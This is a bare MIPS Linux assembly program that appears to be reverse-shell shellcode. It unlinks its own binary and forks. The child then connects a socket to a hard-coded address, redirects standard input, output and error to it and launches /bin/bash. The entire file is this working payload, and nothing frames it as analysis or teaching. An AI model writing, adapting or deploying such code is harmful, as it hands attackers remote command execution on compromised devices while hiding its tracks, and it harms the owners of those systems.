	.text
	.globl __start
#	.set noat
__start:
	li $v0, 4010 # unlink
	lw $a0, 4($sp)
	syscall

	
	li $v0, 4002 # fork
	syscall
	bne $v0, $zero, exit
	
	li   $v0, 4102  # socketcall
	li   $a0, 1     # socket
	la   $a1, socket_args
	syscall
	move $t1, $v0  # $t1 = s
	
	li $v0, 4170    # $t2 = connect
	move $a0, $t1   # Socket
	la $a1, addr
	li   $a2, 16
	syscall

	# Dup2
	li $t2, 4063
	move $v0, $t2
	move $a0, $t1
	move $a1, $zero
	syscall
	
	move $v0, $t2
	add $a1, $a1,1
	syscall
	
	move $v0, $t2
	add $a1, $a1,1
	syscall

	li $v0, 4011
	la $a0, shell
	move $a1, $zero
	move $a2, $zero
	syscall

exit:	
	# Exit
	li $v0, 4001
	li $a0, 0
	syscall


shell:  .asciz "/bin/bash"
addr:	.quad 0x000211117f000001
socket_args:	.word 2, 2, 6

